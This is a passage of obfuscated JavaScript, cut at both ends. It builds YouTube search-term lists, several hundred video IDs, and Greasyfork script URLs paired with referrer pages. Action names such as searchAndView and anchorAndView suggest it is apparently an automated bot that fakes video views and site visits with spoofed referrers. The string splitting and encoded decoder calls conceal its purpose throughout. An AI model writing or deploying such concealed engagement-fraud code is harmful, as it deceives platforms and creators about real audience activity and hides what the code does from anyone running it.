searchTerms['push'](('moomoo.io,' + 'moomoo.io\x20' + 'hack,moomo' + 'o.io\x20defea' + 'ting\x20hacke' + 'rs,moomooi' + 'o,moomoo.i' + 'o\x20mods,moo' + 'moo.io\x20ins' + 'ta\x20kill,mo' + 'omoo.io\x20sa' + 'ndbox,moom' + 'oo.io\x20hack' + 's,moomoo.i' + 'o\x20base,moo' + 'moo.io\x20wor' + 'ld\x20record,' + 'moomoo.io\x20' + 'hacker,moo' + 'moo.io\x20hac' + 'k\x20link,moo' + 'moo.io\x20hig' + 'h\x20score,mo' + 'omoo.io\x20tr' + 'olling,moo' + 'moo.io\x20def' + 'eating\x20aut' + 'o\x20healers,' + 'moomoo.io\x20' + 'raiding\x20ba' + W(0xc) + '.io\x20update' + ',moomoo.io' + '\x202,moomoo.' + 'io\x20tutoria' + 'l,moomoo.i' + 'o\x20gameplay' + ',moomoo.io' + '\x20new\x20updat' + X(0x13) + 'o\x20instakil' + 'l,moomoo.i' + 'o\x20highligh' + 'ts,moomoo.' + 'io\x20game')['split'](',')), searchTerms['push'](('mrbeast,mr' + '\x20beast,mrb' + 'east\x20team,' + 'mrbeast\x20cr' + 'ew,the\x20old' + '\x20mrbeast\x20c' + 'rew,mrbeas' + 't\x20ex\x20emplo' + 'yees,mrbea' + 'st\x20ex-empl' + 'oyees,mrbe' + 'ast\x20live,m' + 'rbeast\x20hin' + 'di,mr.\x20bea' + 'st,mrbeast' + '\x20studio,mr' + 'beast\x20gami' + 'ng,sunnyv2' + '\x20mrbeast,m' + 'rbeast\x20sun' + 'nyv2,mrbea' + 'st\x20in\x20hind' + 'i,who\x20is\x20m' + 'r\x20beast,mr' + '\x20beast\x20hin' + 'di,mr\x20beas' + 't\x20react,wh' + 'at\x20happene' + 'd\x20to\x20mrbea' + 'st\x20ex\x20empl' + 'oyees,mr\x20b' + 'east\x20studi' + 'o,mr\x20beast' + '\x20gaming,mr' + 'beast\x20ware' + 'house,mr\x20b' + 'east\x20in\x20hi' + 'ndi,mr\x20bea' + 'st\x20podcast' + ',mister\x20be' + 'ast,mrbeas' + 't\x20last\x20to\x20' + 'leave')['split'](',')), searchTerms['push'](('minecraft,' + 'minecraft\x20' + 'hardcore,h' + 'ardcore\x20mi' + 'necraft,mi' + 'necraft\x20ch' + 'allenge,mi' + 'necraft\x20bu' + 't,minecraf' + 't\x20mod,mine' + 'craft\x20mods' + ',minecraft' + '\x20100\x20days,' + 'minecraft\x20' + 'funny,funn' + 'y\x20minecraf' + W(0x16) + 't\x20video,mi' + 'necraft\x20sc' + 'hool,100\x20d' + 'ays\x20minecr' + 'aft,minecr' + 'aft\x20animat' + 'ion,w\x20mine' + 'craft,mine' + 'craft\x20comp' + 'ilation,mi' + 'necraft\x20pe' + ',monster\x20s' + 'chool\x20mine' + 'craft,mine' + 'craft\x20mons' + 'ter\x20school' + ',to\x20be\x20con' + 'tinued\x20min' + 'ecraft,min' + 'ecraft\x20izl' + 'e,minecraf' + 't\x20story,mi' + 'necraft\x20mo' + 'vie,minecr' + 'aft\x20house,' + 'minecraft\x20' + 'fakir')['split'](',')), searchTerms['push'](['moomoo.io\x20' + 'zyenith']['repeatExte' + 'nd'](-0x9f9 + 0x145 * 0x1a + -0x16ff)), searchTerms['push'](['moomoo.io\x20' + 'spyder']['repeatExte' + 'nd'](0x4 * 0x1e2 + 0x19 * -0x107 + 0x1231 * 0x1)), searchTerms['push'](('bts,bts\x20v,' + 'jin\x20bts,bt' + 's\x20news,bts' + '\x20army,v\x20bt' + 's,rm\x20bts,b' + X(0x11) + 'jin,bts\x20sa' + 'd,sad\x20bts,' + 'bts\x20日本語,bt' + 's\x20韓国語,bts\x20' + '面白い,cctv\x20b' + 'ts,suga\x20bt' + 's,army\x20bts' + ',bts\x20live,' + 'kpop\x20bts,j' + 'imin\x20bts,j' + 'hope\x20bts,b' + 'ts\x20funny,b' + 'ts\x20日本語字幕,b' + 'ts\x20update,' + 'bts\x20future' + ',bts\x20eatin' + 'g,bts\x20stre' + 'ams,bts\x20日本' + '語字幕最新,taeh' + 'yung\x20bts,j' + 'ungkook\x20bt' + 's,bts\x20reac' + 'tion,bts\x20s' + 'truggle,bt' + 's\x20marriage' + ',bts\x20jungk' + 'ook,bts\x20面白' + 'い\x20日本語字幕,bt' + 's\x20playlist' + ',bts\x20play\x20' + 'game,bts\x20n' + 'ew\x20video,b' + 'ts\x20news\x20to' + 'day,bts\x20in' + 'terview')['split'](',')), searchTerms = searchTerms['flat'](0x1b1a + 0x15ff + 0x3d * -0xce);
const hookPlaylistPoints = [
    'eHpl-BjXo5' + '8',
    '-PgyODlV6V' + '8',
    'S9EkXX0QYD' + 'U',
    'WvcG1OKdHW' + 'o',
    'b6gOcEwtZ8' + 'U',
    'apdtzA0Dzf' + 'k',
    'YiukDwYv2K' + '4',
    'zK-6UH5R5X' + '8',
    'bIXqNjtsEf' + '4',
    '3l253rESkw' + 'Q',
    'u6RVZKcN9z' + 'Q',
    '6ImZdwpdwT' + 'A',
    '0qPB5ANSBK' + 'c',
    '92duH3cqn1' + 'M',
    'b5lKI78fw3' + 's',
    'zpCCPZfP8L' + 'I',
    'ES7oooakr-' + 'c',
    '2eWyJ8FBvQ' + '8',
    'O4-B3OFPDf' + 'Q',
    'JFcnGk0_u7' + 'o',
    'AP7d2Ghq6d' + 'U',
    'UizEAwrZAG' + 'I',
    '0FAi5-h8Hj' + '0',
    'CNqA6IYj17' + 'k',
    'tSiKyCpwnS' + 'Y',
    'OrglyeV5xP' + 'Y',
    'BXkB-g4eCc' + 's',
    'Y53CmmpbOJ' + 's',
    'sm5MLz_IrQ' + 'k',
    'EuciRU_Ska' + '0',
    'cCbDCTLyPc' + 'E',
    'Ox7Ng5T7bm' + 'c',
    'TXTaB-dQg-' + '0',
    '3jSWaWgr_A' + '0',
    'xT8nvuxCRB' + 'E',
    '3c4Ab9EmRg' + 'Y',
    '2kScgeNOpL' + '8',
    't22jhowMom' + 'c',
    'HbcDLgkmXL' + 's',
    'JsKZ41uTeg' + 'c',
    'dfU48FRgs0' + 'g',
    '3K9ILewnUk' + 'o',
    'QmKwnRiKhD' + 'k',
    'n3nVsWsL6I' + 'k',
    'noTs52D_Mw' + 'Y',
    'A0tDR4nTTK' + '0',
    '9eBwFca-B1' + '4',
    'moasU30H5l' + 'A',
    '_Mb8oQtSBW' + 'E',
    'TNGGOgwPtc' + 'M',
    '-pYA-gjkQ8' + 's',
    '5d-dB6tZZA' + 'o',
    '8H2AiOV0oE' + 'o',
    'mI7aiKDGde' + 'w',
    'D-IMDYrj35' + '4',
    'gKgFiEgghy' + 'g',
    'mjVwfjJ2nj' + 'k',
    '6auDBi-D2H' + 'M',
    'X89-SWNdIE' + 'k',
    'T5Pn4LhIwj' + 'M',
    'wVnKGSjY3i' + '8',
    'g11NJftxw1' + '4',
    '9zHirkfEKk' + 'k',
    'ZyGS_AMbIa' + '4',
    'yG6bwB17ZP' + 's',
    'aytHiLe0s6' + 'U',
    'cGe-Mpw_F1' + 'w',
    'eMK7xV_nxZ' + 'o',
    'epJ2MAKa1Y' + 'Q',
    '5BNbKKMUhE' + 'o',
    'oxpAvc6tDP' + '8',
    'jRcc-NIR2R' + 'I',
    '258btO4mFw' + '4',
    'pXjJAUvSbQ' + 'A',
    '63-irfPjh2' + 'c',
    'xbrDZAFf3Q' + 's',
    'MVHMtRlesU' + 'g',
    'zed05qfHMB' + 'I',
    'nkhkxKUHsY' + 'g',
    'n4cSAqR9H1' + 'Q',
    'gOUPndcj7z' + 'I',
    'n3HBTTDHoX' + '8',
    'XIgMFHPIXv' + '4',
    'oQHKMky-_K' + 'c',
    'zfDgTzZ2nh' + '0',
    '1PYettRo-D' + 'M',
    'jzuZuwF490' + '4',
    '2DAgWTlXae' + '8',
    'keouUYA5hI' + 'k',
    'F7i7wRlGCd' + 'c',
    'uToD2c0CdJ' + 'c',
    'Y8DzpdFZZ8' + '8',
    '-rrH657DAa' + 'o',
    'QTrEEWtDks' + '4',
    'TWTSnQDuad' + 'Y',
    'a0GUyvgnzg' + 'c',
    'eSReWZQyKd' + 'E',
    'D_5pMqdKSs' + '4',
    'm0ie8gHS00' + 'I',
    '6WosqMq9ej' + 'o',
    'i0afAOlon_' + '4',
    'j_fe6PfxW4' + 'Y',
    'GfPzi8SYr0' + 'w',
    'MSgZhNCwff' + 'M',
    'wxyBC_z6bI' + '8',
    'PkQpV-Fwhs' + 'k',
    'bVD6cWOVhN' + 'U',
    'mjZOpQlHbx' + 'M',
    'k_BXkcdbBO' + 'M',
    'X72oUsFV7q' + '0',
    'lONsILfq-W' + 'Y',
    'Bhe9PyM_s_' + 'Q',
    'Bhe9PyM_s_' + 'Q',
    'h4TBnDkX4y' + 'o',
    'PNBJyHEkfk' + '4',
    'L3iHS__ufc' + 'g',
    'm7aliUAwm_' + 'Y',
    'FuPVf85zMi' + 'w',
    'gtupAeNTDS' + 'M',
    'yyJ8zkckoB' + '8',
    'ZDTESiN1eS' + 'w',
    'Fo6x16DkoR' + 'o',
    'IAJqRxhVqO' + 'k',
    'KAgwII8TGj' + 'o',
    'o4tLCshmlb' + 'M',
    'dLj5fIupdA' + 'o',
    '_Xl_-b9P4U' + 'Q',
    'V3NxxpUUfW' + 'E',
    'J3ygeDEMnO' + 'w',
    'HcP_xmdwsl' + 'c',
    'M9g0h7px2_' + 'M',
    'b5WfUvcSgr' + 'U',
    'JGHnIshsoC' + 'E',
    'x2gfhCLHd9' + '4',
    'M5Fr8G0ma9' + 'o',
    '3sGeIBfFlC' + 'M',
    'k74y4KOJ2m' + '4',
    'pTHJB0S8E-' + 'U',
    'KaIrXJLfYP' + 'M',
    '0cisZkywhg' + 'Q',
    '0dVzItbl9E' + 'w',
    't0EqnhcSb1' + 's',
    'MuiXtvo1RY' + 'E',
    'Nj-3KC6knH' + 'w',
    'B19HbETNi5' + '8',
    'yKN_QkroH6' + 's',
    'U9ExFM1pji' + '0',
    'sONzDfjKhL' + '4',
    'n3Kj8zEfew' + 'U',
    'nXLGQ7QeoG' + 'Y',
    'OQFQiwiM-P' + 'Y',
    'UtPRpKRTtH' + 'U',
    'E56Myp0BzE' + 'E',
    '7DjOp_JM2Z' + 'w',
    'rNFLQFz_G1' + 'g',
    '1r2pKoVAdj' + 'M',
    'gm3eiv6UND' + 'M',
    'yOiROfjxzX' + 'o',
    'lt2AcxC_ap' + 'g',
    'bObEme2BDO' + 'E',
    '6Ut6HbJmW4' + 'w',
    'fUs0TtQQTo' + '0',
    '_phHS3FAgW' + 'Q',
    '1f8sU4l3dP' + '4',
    'HwTSLUd53K' + '8',
    'EpP2ymD_QG' + 'A',
    'TQ69QFqmbo' + 'I',
    'wA8BqUka_u' + '0',
    'bc8Ey-vuR5' + 'M',
    'PZ_uLi7ULl' + '0',
    'smu5FsnhwF' + '4',
    'dv1JluwoOb' + 'c',
    'nHotP0jbcv' + 'A',
    'iIjYNEmrVv' + 'M',
    'SeP-OZAiPb' + 'c',
    'v52PClvMFt' + 'k',
    '3loLqIPxTS' + '0',
    'jVu9mOzbSq' + 'U',
    '73SAN1vOrV' + 'k',
    'YLPxp4ntym' + 's',
    'YWXfelRk3b' + 'Q',
    'CsxlLMb6Uj' + 'o',
    'uafGOfwzpa' + 'Q',
    'XIr8qotHOI' + 'E',
    'EcoPCWC3Uh' + 'o',
    'AhOwyT8aIh' + 'g',
    't-Ox7lI5UH' + 's',
    'i08qNmssXe' + 'Q',
    'QrJIU09eD-' + 'g',
    'QvNNCQ-8Rp' + 'E',
    'k5gjnjDFAZ' + 's',
    'h_NQ3y1ek8' + 'U',
    'evPsJlNLy_' + '4',
    'qEPTydgwh4' + 's',
    'LB685ckhuf' + 'E',
    'Lj1EcSMGey' + '0',
    'OE19r7MIMW' + 'Q',
    'u8E3p0Vy-P' + 'Y',
    'f4a5OPFQa7' + 'k',
    'XDo7Q7yUEt' + 'k',
    'Vw_9zw0qHI' + 'c',
    'KGT5nbDsI_' + '8',
    'E008Eql59M' + 'Q',
    'wSOFdefX47' + 'A',
    '2xcv7q3QhR' + 'E',
    'hgfvmcBkc0' + '4',
    '0wP7csnX7k' + '4',
    'Xo0R8WiRSb' + '4',
    '8zNp8EOpGd' + '4',
    'sWYhIJZmoS' + 'E',
    'YdG8U1W-bX' + '0',
    'QeDsoSNml-' + 'c',
    'xW5q77El0x' + '8',
    'ZF14issJFE' + 'Y',
    'TRglEGLLKX' + 'o',
    'UE0SXc5k1e' + 'g',
    '6VY65D8f3D' + 'Q',
    'Iwxuob4fA8' + 'Q',
    'M4elJHCUIi' + 's',
    'GY9WWhO504' + 'k',
    'eErUSxmLDw' + '8',
    'ITQfAfzLj3' + 'I',
    'vbDrCL2FuL' + 'g',
    'KyQ_sUgtbK' + 'U',
    'lbEJcipUp8' + 'I',
    '2SqCn2LreN' + 'g',
    '1i-G2TUn41' + '0',
    's0ru6uK7vi' + '8',
    'gOxiE5UAAD' + 'w',
    'lx1rOOjekc' + '8',
    '5VYN2zA-Si' + 'k',
    'q9rLWEAzoo' + 'k',
    '4KSm3IY7Xz' + 'g',
    'fMqRu_ON-D' + 'E',
    'GfvShU6Sy9' + 'A',
    'OHzOmi1b60' + 'Y',
    'D9oTUKT-_n' + 'A',
    '_BrT2PlUiw' + '0',
    'kuuI4LzKgm' + 'I',
    '78dymyg88r' + 'M',
    'mi0nGt2B-q' + 'o',
    'HaI7BjnwnO' + 'c',
    'xlAEOkIuy7' + 'Y',
    '3VmtckvTXl' + 'U',
    'ed7TWHKDr4' + 'E',
    '2LfTjyVtbf' + 'U',
    'STHlCkloyv' + 'E',
    '-BI_-6YnM6' + 'Y',
    'LSK_G1qCQw' + 'M',
    '4tzqIl6EKV' + 'k',
    '9DshU55EiV' + '8',
    'mBtaEI_6e8' + 's',
    '960lvuduwY' + 'w',
    'XWJH-6J5Ee' + 'g',
    'XLS4qmyCAX' + 'g',
    '8cJDYeRiLn' + 'k',
    'cCaIVrltHz' + 'w',
    '8X2fF4pgM0' + 'E',
    '6s8Xm4wylr' + '4',
    'eFceshvavn' + 'o',
    '2h4g7euqR-' + 'U',
    'ujiBqXnn92' + '8',
    'w9F2NST-9j' + 's',
    'w-oc7F5Mmy' + 'U',
    'UYrmqL3cOD' + 'U',
    '4QB59etj0I' + 'o',
    'MY9MTNgXcN' + 'o',
    'ISBmcKDS5C' + '8',
    'ogIb7A7tvW' + '0',
    '-L583IZF6s' + 'k',
    'NbeKQq29ZL' + '0',
    'SPplDxd74F' + 's',
    'MHGV8QmpAz' + 'k',
    'iWzezFWpU7' + 'A',
    'NNCQt1rXXE' + 'Y',
    'bcb_ZhJJK8' + 'g',
    '3KoZGQiY6N' + 'o',
    'aSaXQH8F1_' + 'A',
    'V5nMOhI62o' + 'w',
    'JvlPjRUdId' + '0',
    '2gQHuClLCb' + '0',
    '5e-qDy-uUJ' + 'E',
    'oE8vC0QEWU' + 'E',
    '7cQken99yu' + 'o',
    'pmzu080j7r' + 'I',
    'sVy9F4whP6' + 'o',
    'MJrkylk7iE' + 'c',
    'XYjsTxi6oE' + '8',
    'mKlMouB6tp' + '0',
    'o2yunZQley' + 'A',
    'oRryU9F9Lv' + 's',
    'uzzK-052H0' + 'c',
    'VSvA4rCe-4' + 'M',
    'XURH2u_0fM' + 'I',
    'yfpVL2g_tk' + 'o',
    'AuEEjQ8x9o' + 'w',
    'wWkviY8zBr' + 'c',
    'zt_eubHWhx' + 'c',
    'O_7_BGU3u_' + '0',
    'QFDKBxmOn3' + 'Y',
    'w6gccNWXXv' + 'g',
    'VdNJxbrqdX' + 's',
    'wbi5Dxebvn' + 'I',
    'XEFOREYrJg' + 'k',
    'I2rcRta7WJ' + '0',
    'OP5KGfXHX_' + 'A',
    'w2MUMbbwlm' + 'o',
    'X3bF0nd6kf' + 'w',
    'WDDAhASf9j' + 'w',
    'fRwcV8gjbc' + 'w',
    '7T63gaRThr' + '0',
    'zC8AWIwhbf' + 's',
    'JSkVE0n-ee' + 'o',
    'qiQA5pWWRt' + 'U',
    'QdXCjZtfXu' + 'c',
    'vlBji8TOax' + 'o',
    'pBx_5CbIcp' + 'o',
    'L1Oy5F6ZMO' + 'Q',
    'P0NjLaBed-' + 'E',
    'DR16C4-keB' + '0',
    'LGmpIpu9eD' + 'w',
    'rNkX_A4kBA' + 'Q',
    'QztVMjrEk4' + '0',
    'uOM6m6KL5d' + '4',
    'g-Aju8xrrO' + 'E',
    'DfkDbFk_x9' + '8',
    'Y4NLDaowD6' + 'I',
    'ALSZnqQTuJ' + 'o',
    'xUmB6BpZBE' + 'w',
    'SxNOcZ1s85' + '8',
    '-noeCjO416' + 'k',
    'taPJqXBI8V' + 'Y',
    'YxqbkMi1Is' + '4',
    'vnJTyve2r-' + '4',
    '44lRVYQ38E' + 'Q',
    'QOv1N1X5J-' + 'g',
    'jNjREs7ODT' + 'g',
    'U30ToJo3dd' + 'k',
    'rm7lNIIOQC' + 'Y',
    'mGU6sOPlYv' + 'c',
    '6pwxUXdt6T' + 'Q',
    '6MkJRee35a' + 'Q',
    'LVbf7U9WAI' + 'c',
    'gPbhFvEeJ3' + 'M',
    'LWXAxz0MiH' + 'A',
    'L0KQJqfwJJ' + 'Y',
    'GWr33_u0VK' + 'c',
    '4ud3ZPfWkH' + 's',
    'dxSrySC4XM' + 'c',
    'iIM2KZC69W' + '0',
    '8DuJ3BAwME' + 'o',
    'm3BAhe1wsl' + 'Y',
    '02U_3pAZxM' + '8',
    '0e7nidPa97' + 'g',
    'TixW__6Eer' + 'o',
    'q46W8MTRTC' + 'E',
    'Jdxp04Je1O' + 'w',
    'HfP4TO3gfN' + '0',
    '4dUJaeB0qL' + '8',
    'xnL-fRJ3RZ' + 'o',
    'yJbD0Df45u' + 'Q',
    '-pGw8RkSSB' + 'k',
    '7cy86Njsis' + 'M',
    'jbgqvxtauo' + '4',
    'N8M00JjSVI' + 'I',
    'MfR5q6Td3R' + 'c',
    'eHwcx94wcp' + 's',
    'olDgVFgAgP' + 'o',
    'eAAd5BmzXz' + 'M',
    'xgTjQ2sGXd' + '4',
    'ipny6JUbzw' + 's',
    'WOwQ0UxbRj' + '4',
    'h0PKFed2GB' + 's',
    'JxdOrgzq7Z' + '8',
    '-VgpSWWW-8' + 'w',
    '-ix4OizkAn' + 's',
    'd3CRE9y3YV' + 's',
    '4QZlfXxorJ' + 'o',
    'YlDpg8aCs5' + 'M',
    'Qe5WT22-AO' + '8',
    'b_rjBWmc1i' + 'Q',
    '9yjZpBq1XB' + 'E',
    'hPx-RiBKXt' + 'Q',
    'UMqLDhl8PX' + 'w',
    'DlJEt2KU33' + 'I',
    'BWeqoARup-' + 'Q',
    '2Dx76lD8Sc' + 'c',
    'j_nI6G3ZDi' + 'E',
    'zvcUYYN1sx' + 'w',
    'cWRkYo1S3L' + '4',
    'cWRkYo1S3L' + '4',
    'bxC_PN3SRv' + 'I',
    '94m93T_5JL' + 'M',
    'RBSHAH4iWU' + '8',
    'RBSHAH4iWU' + '8',
    'RBSHAH4iWU' + '8',
    'bo9fTeXvSi' + 'A',
    'z6LqXiAK-8' + '0',
    '5tbOspjJ5f' + '0',
    'twQ6kKjtBk' + 'Y',
    'Ig17K38Fy0' + 'Y',
    'ZdlrVDwn_a' + '4',
    'aCT4Lddunx' + 'g',
    'acAvMGQtln' + 'M',
    '8XkcbdSRdO' + '0',
    '0e3GPea1Ty' + 'g',
    'zxYjTTXc-J' + '8',
    '9bqk6ZUsKy' + 'A',
    'plSyrHqUh7' + '8',
    'HkvQywg_uZ' + 'A',
    'lADBHDg-Jt' + 'A',
    'I2O7blSSzp' + 'I',
    'kd2KEHvK-q' + '8',
    'CbUjuwhQPK' + 's',
    'fb7T1v_VHp' + 'E',
    'SpeSpA3e56' + 'A',
    'RQdxHi4_Pv' + 'c',
    'nx2-4l4s4N' + 'w',
    'tUTCq3iiw_' + '4',
    'VDa5iGiPgG' + 's',
    'S-sJp1FfG7' + 'Q',
    'Hm1YFszJWb' + 'Q'
  ],
  GlobalActions = [
    searchAndView,
    anchorAndView,
    frontScreenActions,
    keyWatch
  ],
  wait = f => new Promise(h => setTimeout(h, f)),
  scriptTargets = [{
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/457024' + '-surviv-io' + '-xclient-b' + 'eta',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/surviv.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/404065' + '-%E7%BD%91' + '%E9%A1%B5%' + 'E7%B2%BE%E' + '7%81%B5',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/51cto.co' + 'm'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/22545-' + 'anti-bd-re' + 'direct',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/zn-CN/s' + 'cripts/by-' + 'site/baidu' + '.com?page=' + '4'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/zn-CN/s' + 'cripts/385' + '044-zhihu-' + 'anonymous-' + 'users',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/zn-CN/s' + 'cripts/by-' + 'site/zhihu' + '.com'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/zn-CN/s' + 'cripts/302' + '36-zhihu-l' + 'ink-fix',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/zn-CN/s' + 'cripts/by-' + 'site/zhihu' + '.com'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/435948' + '-btb',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/baidu.co' + 'm'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/430335' + '-wb-script',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/zhihu.co' + 'm'
    },
    {
      'url': 'https://gr' + V(0x2, 'ojW)') + 'rg/en/scri' + 'pts/430572' + '-beautify-' + 'the-baidu-' + 'homepage',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/zhihu.co' + 'm'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/410781' + '-diep-io-a' + 'nti-afk-ti' + 'meout',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/diep.io'
    },
    {
      'url': 'https://gr' + X(0x1) + 'rg/en/scri' + 'pts/1196-v' + 'iew-youtub' + 'e-tags',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/21012-' + 'youtubeext',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/20798-' + 'youtube-hi' + 'de-volume-' + 'control',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/9090-y' + 'outube-add' + '-video-id-' + 'text-field',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/20710-' + 'calm-down-' + 'youtube',
      'preRef': X(0x12) + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/39544-' + 'youtube-po' + 'lymer-disa' + 'ble',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/412698' + '-youtube-a' + 'uto-skip-a' + 'ds',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/413965' + '-youtube-l' + 'ike-dislik' + 'e-video-an' + 'd-skip-ad-' + 'keyboard-s' + 'hortcuts-f' + 'ork-from-n' + 'erevar009',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/39919-' + 'youtube-su' + 'ggested-vi' + 'deo-hider-' + 'for-youtub' + 'e-classic',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/414756' + '-requestho' + 'ok',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/414876' + '-live-chat' + '-mod-calib' + 'er',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/40462-' + 'youtube-no' + '-resume',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/40517-' + 'youtube-re' + 'sume',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/415706' + '-moomoo-io' + '-remove-co' + 'okie-prefe' + 'rences-tab',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/405955' + '-web-secur' + 'ity',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/381682' + '-html5%E8%' + 'A7%86%E9%A' + '2%91%E6%92' + '%AD%E6%94%' + 'BE%E5%99%A' + '8%E5%A2%9E' + '%E5%BC%BA%' + 'E8%84%9A%E' + '6%9C%AC',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/429635' + '-always-on' + '-focus',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/30310-' + 'removeads',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/455853' + '-%E7%BD%91' + '%E9%A1%B5%' + 'E8%AE%BF%E' + '9%97%AE%E5' + '%8A%A0%E9%' + '80%9F%E5%9' + '9%A8',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/454941' + '-hcaptcha-' + 'captcha-so' + 'lver-by-no' + 'captchaai',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/374794' + '-lift-web-' + 'restrictio' + 'ns-io-game' + '-mods-moom' + 'oo-io-krun' + 'ker-io-ad-' + 'link-bypas' + 'ser-adbloc' + 'k-more',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/baidu.co' + 'm'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/374794' + '-lift-web-' + 'restrictio' + 'ns-io-game' + '-mods-moom' + 'oo-io-krun' + 'ker-io-ad-' + 'link-bypas' + 'ser-adbloc' + 'k-more',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/374794' + '-lift-web-' + 'restrictio' + 'ns-io-game' + '-mods-moom' + 'oo-io-krun' + 'ker-io-ad-' + 'link-bypas' + 'ser-adbloc' + 'k-more',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/discord.' + 'com'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/407994' + '-mope-io-a' + 'uto-dive-a' + 'uto-boost-' + 'see-people' + '-underwate' + 'r-see-invi' + 'sible-play' + 'ers-remove' + '-ads',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/mope.io'
    },
    {
